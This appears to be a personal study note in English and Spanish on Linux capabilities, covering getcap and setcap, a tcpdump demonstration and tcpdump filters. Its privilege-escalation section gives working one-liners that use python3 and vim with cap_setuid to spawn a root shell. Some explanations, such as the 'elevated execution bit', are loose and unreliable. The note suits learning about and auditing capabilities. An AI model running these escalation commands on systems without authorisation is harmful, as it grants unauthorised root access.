Note title: Untitled

https://www.youtube.com/watch?v=_lo2dTYwZG8

In Linux systems, capabilities are a security feature that allows users to perform actions that normally require superuser (**root**) privileges, without granting them full superuser access. This enhances security, as a process needing only specific privileges can obtain them without running as root.

Capabilities are divided into 3 types:

- **Effective capabilities**: Permissions directly applied to the process that holds them. These determine what actions the process can perform. For example, the "**CAP_NET_ADMIN**" capability allows the process to modify network configuration.
- **Inheritable capabilities**: Permissions inherited by child processes. These may be in addition to the parent process's effective capabilities. For example, if a parent process has "**CAP_NET_ADMIN**" configured as inheritable, child processes will also have this capability.
- **Permitted capabilities**: The full set of permissions a process is allowed. This includes both effective and inheritable capabilities. A process can only execute actions for which it has permitted capabilities. For example, with "**CAP_NET_ADMIN**" and "**CAP_SETUID**" as permitted, a process can modify network settings and change its **UID** (**User ID**).

Some capabilities pose security risks if assigned to certain binaries. For example, **cap_setuid** allows a process to set its UID to another value, potentially enabling malicious code execution with elevated privileges.

To **list** a binary's capabilities in Linux, use the **getcap** command. It shows effective, inheritable, and permitted capabilities. For example, to check capabilities for **/usr/bin/ping**:

➜ `getcap /usr/bin/ping`

Output will display assigned capabilities:

➜ `/usr/bin/ping = cap_net_admin,cap_net_raw+ep`

Here, the ping binary has two capabilities: **cap_net_admin** and **cap_net_raw+ep**. The latter indicates the elevated execution bit (**ep**) and **cap_net_raw** capability.

To **assign** a capability, use **setcap**. For example, granting **cap_net_admin** to **/usr/bin/my_program**:

➜ `sudo setcap cap_net_admin+ep /usr/bin/my_program`

This grants **cap_net_admin** and sets the elevated execution bit (**ep**), allowing my_program to manage network configuration.

The **elevated execution bit** ("**ep**") is a special attribute for Linux binaries. When set, the file executes with its assigned effective capabilities rather than the user's privileges, enabling restricted actions without full superuser rights.

Permitted capabilities can be further restricted via Mandatory Access Control (MAC) systems like **SELinux** or **AppArmor**, which enforce security policies on process actions.


Let's test with the tcpdump binary - normally only root or privileged users can capture traffic:
![Pasted image 20260214133325](/VaultSite/wiki-images/Pasted%20image%2020260214133325.png)
![Pasted image 20260214133339](/VaultSite/wiki-images/Pasted%20image%2020260214133339.png)

We can list capabilities of running system binaries by checking process IDs in /proc/. For example, examining /proc/9/status:
![Pasted image 20260214133632](/VaultSite/wiki-images/Pasted%20image%2020260214133632.png)
Filtering with grep for "cap" shows capabilities:
![Pasted image 20260214133718](/VaultSite/wiki-images/Pasted%20image%2020260214133718.png)

Download [[CAPSH]] to decode capability information.

Running it with --decode on a capability value shows details:
![Pasted image 20260214133946](/VaultSite/wiki-images/Pasted%20image%2020260214133946.png)
![Pasted image 20260214134000](/VaultSite/wiki-images/Pasted%20image%2020260214134000.png)

As root, we assign capabilities to tcpdump:
![Pasted image 20260214134111](/VaultSite/wiki-images/Pasted%20image%2020260214134111.png)
Here we granted a capability allowing any user to execute tcpdump.

Switching back to an unprivileged user, listing capabilities with getcap:
![Pasted image 20260214134222](/VaultSite/wiki-images/Pasted%20image%2020260214134222.png)
Now tcpdump executes successfully:
![Pasted image 20260214134354](/VaultSite/wiki-images/Pasted%20image%2020260214134354.png)


# 🛡️ Linux Capabilities: Privilege Escalation

## 📖 Core Concepts
**Capabilities** split root privileges into smaller units. This lets binaries perform privileged tasks without being SUID (SetUID) binaries.

### Common Capability Types:
* **cap_net_admin**: Manage network interfaces and sniff traffic.
* **cap_setuid**: Lets a process change its User ID (high-value for attackers).
* **cap_dac_override**: Read/write any system file, bypassing permissions.

---

## 🛠️ Tools and Commands

| Command | Function |
| :--- | :--- |
| `getcap` | List file/directory capabilities. |
| `setcap` | Assign/remove capabilities (requires privileges). |
| `capsh --decode` | Decode hex capability values from `/proc/status`. |
| `getpcaps [PID]` | Show capabilities of a running process. |

---

## 🔍 Step 1: Enumeration (Discovery)
As attackers, we search for binaries with insecurely assigned capabilities. System-wide search:

```
 bash
getcap -r / 2>/dev/null
```

Note title: Untitled

### 1. Python3 (Direct Privilege Escalation)

If you find that `python3` has the `cap_setuid+ep` capability, you can use it to change your UID to 0 (root) and spawn a shell:

Bash

```
# Comando para escalar
python3 -c 'import os; os.setuid(0); os.system("bash")'
```

### 2. Vim (Via GTFOBins)

If `vim` (or `vim.basic`) has `cap_setuid+ep`, we can leverage its Python script execution capability to escalate privileges:

Bash

```
# Comando para escalar
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

```bash
setcap cap_net_raw,cap_net_admin+ep /usr/sbin/tcpdump
```

#### Filtros útiles

- `tcpdump -i eth0 -w captura.pcap` → Captura en `eth0` y guarda en `captura.pcap`
- `tcpdump -r captura.pcap` → Lee el archivo `captura.pcap`
- `tcpdump -i eth0 'port 80'` → Solo tráfico HTTP (puerto 80)
- `tcpdump -i eth0 'host 192.168.1.1'` → Solo tráfico con `192.168.1.1`
- `tcpdump -i eth0 'tcp port 22 and src 192.168.1.100'` → SSH desde `192.168.1.100`

#### Privacidad

- **Problema**: Tcpdump captura todo el tráfico, incluyendo credenciales en texto claro (HTTP, FTP, etc.)
- **Solución**: Usar `-A` para ASCII o `-X` para hexadecimal, pero mejor evitar capturar tráfico sensible directamente con filtros.

> [!warning]  
> En redes compartidas, otros usuarios pueden sniffar tu tráfico si no está cifrado (HTTP vs HTTPS).

```
tcpdump -i eth0 -w captura.pcap
```
